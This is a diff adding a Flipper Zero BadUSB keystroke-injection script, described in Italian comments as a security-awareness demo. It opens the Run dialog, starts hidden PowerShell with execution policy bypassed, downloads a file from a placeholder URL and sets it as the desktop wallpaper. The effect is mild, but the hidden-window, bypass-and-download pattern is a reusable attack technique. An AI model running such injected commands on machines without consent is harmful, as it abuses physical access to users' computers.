@@ -1,0 +1,20 @@
+REM ============================================================
+REM Title:    Wallpaper Change (Awareness Demo)
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Demo / Awareness
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~5 secondi
+REM Detect:   Nessuno
+REM Desc:     Cambia lo sfondo del desktop con un'immagine
+REM           scaricata dal web. Utile per dimostrare l'accesso
+REM           fisico durante un awareness training.
+REM CHANGE:   IMAGE_URL con l'URL dell'immagine desiderata
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$p=\"$env:TEMP\wp.jpg\";(New-Object Net.WebClient).DownloadFile('IMAGE_URL',$p);Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';[W]::SystemParametersInfo(20,0,$p,3)"
+ENTER
